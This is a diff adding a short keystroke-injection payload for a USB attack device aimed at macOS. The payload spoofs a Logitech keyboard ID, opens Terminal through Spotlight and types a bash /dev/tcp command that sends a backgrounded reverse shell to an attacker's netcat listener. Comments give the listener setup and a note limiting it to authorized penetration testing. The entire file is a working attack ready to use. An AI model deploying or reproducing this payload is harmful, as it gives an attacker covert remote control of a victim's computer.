@@ -1,0 +1,22 @@
+REM Title: macOS Reverse Shell (netcat)
+REM Author: Community
+REM Target: macOS
+REM Description: Opens reverse shell via netcat
+REM Setup: nc -lvnp 4444 on attacker machine
+REM EDIT LHOST AND LPORT BEFORE USE
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+COMMAND SPACE
+DELAY 600
+STRING terminal
+ENTER
+DELAY 1200
+
+REM CHANGE IP AND PORT
+STRING /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &
+ENTER
+DELAY 1000
